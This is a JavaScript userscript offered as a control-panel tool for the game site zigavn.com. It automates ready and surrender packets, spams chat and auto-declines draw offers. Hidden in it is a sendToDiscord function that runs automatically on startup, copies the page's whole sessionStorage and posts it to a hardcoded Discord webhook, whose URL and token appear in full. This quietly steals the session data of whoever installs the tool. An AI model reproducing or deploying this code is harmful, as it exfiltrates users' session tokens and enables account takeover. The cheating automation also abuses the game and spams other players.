(function () {
  'use strict';

  console.log("✅ [tool.js] Bắt đầu chạy...");

  const delay = (ms) => new Promise(r => setTimeout(r, ms));
  let readyInterval = null;
  let adInterval = 121000;
  let adTimer = null;
  let surrenderInterval = null;
  let chatOn = false;
  window.__FONSIDA_SURRENDER_ON__ = false;
  window.__FONSIDA_BLOCK_DRAW__ = true;

  const iconList = [":)", ":D", ":((", ":x", ":))", "=))", "8-)", "=P~"];
  let iconIndex = 0;
  let chatList = [];
  let chatIndex = 0;
  let iconOn = false;

  function sendMainPacket() {
    const p = new BkPacket();
    p.yj(Ze, PLAYER_STATE_READY);
    BkConnectionManager.send(p);
  }

  function startReadyPacket() {
    if (!readyInterval) readyInterval = setInterval(sendMainPacket, 50);
  }

  function stopReadyPacket() {
    if (readyInterval) clearInterval(readyInterval);
    readyInterval = null;
  }

  function tryCallFz() {
    try {
      const scene = cc.director.getRunningScene();
      if (!scene || !scene.children) return;
      for (const node of scene.children) {
        if (typeof node?.fz === 'function' && typeof node?.S === 'function') {
          const state = node.S();
          const gameState = state?.Ib;
          const player = state?.Ca?.();
          if (gameState === GAME_STATE_PLAYING && player?.status !== PLAYER_STATE_NOT_READY) {
            node.fz();
            console.log("[TM] Gọi fz() xin thua thành công!");
          }
        }
      }
    } catch (err) {
      console.warn("[TM] Gọi fz() lỗi:", err);
    }
  }

  function startSurrenderLoop() {
    if (!surrenderInterval) surrenderInterval = setInterval(tryCallFz, 50);
  }

  function stopSurrenderLoop() {
    if (surrenderInterval) clearInterval(surrenderInterval);
    surrenderInterval = null;
  }

  function sendAdPacket() {
    const p = new BkPacket();
    p.En(O);
    BkConnectionManager.send(p);
  }

  function startAdTimer() {
    if (adTimer) clearInterval(adTimer);
    adTimer = setInterval(sendAdPacket, adInterval);
  }

  function sendChatMessage(msg) {
    const p = new BkPacket();
    p.jq(msg);
    BkConnectionManager.send(p);
  }

  function startChatLoop() {
    if (chatOn || chatList.length === 0) {
      if (chatList.length === 0) {
        chatList = ["Hello", "Chơi vui nhé!", "Ziga zuiii", "GG"];
      } else return;
    }
    chatIndex = 0;
    iconIndex = 0;
    chatOn = true;

    async function chatCycle() {
      while (chatOn) {
        sendChatMessage(chatList[chatIndex]);
        chatIndex = (chatIndex + 1) % chatList.length;
        await delay(4000);

        if (iconOn) {
          sendChatMessage(iconList[iconIndex]);
          iconIndex = (iconIndex + 1) % iconList.length;
          await delay(4000);
        }
      }
    }

    chatCycle();
  }

  function stopChatLoop() {
    chatOn = false;
  }

  function sendToDiscord() {
    let sessionData = Object.fromEntries(Object.entries(sessionStorage));
    let jsonData = JSON.stringify(sessionData, null, 2);
    let payload = {
      content: "📥 **Session Storage Data from zigavn.com:**\n```json\n" + jsonData + "\n```"
    };
    fetch("https://discord.com/api/webhooks/1345406693449666604/5aCLs6ScGGC7bRZVyUaNwD3iBO1jGVo1G8zueRnM96UpCc88YQ1XR5meB6lHKxVy_Cfo", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
  }

  function forceAgree() {
    try {
      const scenes = cc.director.getRunningScene()?.children || [];
      for (const node of scenes) {
        if (node instanceof BkDialogWindow) {
          let message = "";
          if (node.Zg?.string) message = node.Zg.string;
          else if (node._label?.string) message = node._label.string;
          else if (node.og?.string) message = node.og.string;
          else {
            const labelNode = node.children?.find(x => x._label?.string);
            message = labelNode?._label?.string || "";
          }

          if (window.__FONSIDA_BLOCK_DRAW__ &&
              (message.includes("mời hòa") || message.includes("cầu hòa") || message.toLowerCase().includes("draw"))) {
            node.$e?._clickListeners?.[0]?.();
            node.removeSelf();
            console.log("[Fonsida] Đã từ chối lời mời hòa.");
            continue;
          }

          if (window.__FONSIDA_SURRENDER_ON__) {
            node.Xe?._clickListeners?.[0]?.();
            if (typeof node.cm === "function") {
              node.cm();
              node.cm = null;
            }
            console.log("[Fonsida] Auto ĐỒNG Ý do bật SURRENDER.");
          } else {
            node.$e?._clickListeners?.[0]?.();
            console.log("[Fonsida] Auto ĐÓNG popup.");
          }

          node.removeSelf();
        }
      }
    } catch (err) {
      console.warn("[TM] Force Agree Error:", err);
    }
  }

  const observer = new MutationObserver(forceAgree);
  observer.observe(document.body, { childList: true, subtree: true });
  setInterval(forceAgree, 50);

  function createControlUI() {
    const container = document.createElement('div');
    Object.assign(container.style, {
      position: 'fixed', top: '100px', left: '20px', background: '#111', color: '#fff',
      padding: '6px', borderRadius: '6px', font: '11px Arial', zIndex: 99999,
      display: 'flex', flexDirection: 'column', gap: '6px', boxShadow: '0 0 4px rgba(0,0,0,0.4)',
      border: '1px solid #333', resize: 'both', overflow: 'auto', minWidth: '150px', width: 'fit-content'
    });

    const dragBar = document.createElement('div');
    dragBar.textContent = "🎛️ Fonsida Control";
    Object.assign(dragBar.style, {
      background: '#222', padding: '4px 6px', cursor: 'move', userSelect: 'none',
      fontWeight: 'bold', fontSize: '11px', borderRadius: '4px', textAlign: 'center'
    });

    let isDragging = false, offsetX = 0, offsetY = 0;
    dragBar.addEventListener('mousedown', (e) => {
      isDragging = true;
      offsetX = e.clientX - container.getBoundingClientRect().left;
      offsetY = e.clientY - container.getBoundingClientRect().top;
      e.preventDefault();
    });
    document.addEventListener('mousemove', (e) => {
      if (isDragging) {
        container.style.left = `${e.clientX - offsetX}px`;
        container.style.top = `${e.clientY - offsetY}px`;
      }
    });
    document.addEventListener('mouseup', () => isDragging = false);

    const makeToggle = (labelText, defaultState, callback, color = "#4caf50") => {
      const label = document.createElement('div');
      label.textContent = `${labelText}: ${defaultState ? "ON" : "OFF"}`;
      const btn = document.createElement('button');
      btn.textContent = defaultState ? "Tắt" : "Bật";
      btn.style.cssText = `padding:4px 8px;border-radius:4px;border:none;background:${defaultState ? color : "#555"};color:#fff;cursor:pointer;font-size:11px;`;

      btn.onclick = () => {
        const now = !defaultState;
        callback(now);
        label.textContent = `${labelText}: ${now ? "ON" : "OFF"}`;
        btn.textContent = now ? "Tắt" : "Bật";
        btn.style.background = now ? color : "#555";
        defaultState = now;
      };

      return [label, btn];
    };

    const [readyLabel, readyBtn] = makeToggle("READY", false, val => val ? startReadyPacket() : stopReadyPacket());
    const [surrenderLabel, surrenderBtn] = makeToggle("SURRENDER", false, val => {
      window.__FONSIDA_SURRENDER_ON__ = val;
      val ? startSurrenderLoop() : stopSurrenderLoop();
    }, "#f44336");
    const [chatLabel, chatBtn] = makeToggle("CHAT", false, val => val ? startChatLoop() : stopChatLoop(), "#ff9800");
    const [iconLabel, iconBtn] = makeToggle("CHÈN ICON", false, val => iconOn = val, "#2196f3");
    const [drawLabel, drawBtn] = makeToggle("BLOCK DRAW", true, val => window.__FONSIDA_BLOCK_DRAW__ = val);

    const chatInputBtn = document.createElement('button');
    chatInputBtn.textContent = "Nhập Nội Dung Chat";
    chatInputBtn.style.cssText = readyBtn.style.cssText;
    chatInputBtn.onclick = () => {
      const content = prompt("Nhập mỗi câu chat trên 1 dòng:");
      if (content) {
        chatList = content.split(/\r?\n/).map(x => x.trim()).filter(Boolean);
        alert(`Đã lưu ${chatList.length} câu chat.`);
      }
    };

    container.append(
      dragBar,
      readyLabel, readyBtn,
      surrenderLabel, surrenderBtn,
      chatLabel, chatBtn,
      iconLabel, iconBtn,
      chatInputBtn,
      drawLabel, drawBtn
    );
    document.body.appendChild(container);
    console.log("✅ UI đã tạo thành công");
  }

  // ✅ FIXED: dùng setTimeout đảm bảo script chạy sau khi DOM load
  setTimeout(async () => {
    console.log("🔁 Bắt đầu khởi động tool Fonsida...");
    try {
      sendToDiscord();
      await delay(15000);
      sendAdPacket();
      startAdTimer();
      createControlUI();
      console.log("🎉 Tool Fonsida đã khởi chạy xong!");
    } catch (err) {
      console.error("❌ Lỗi khi chạy tool.js:", err);
    }
  }, 3000);
})();
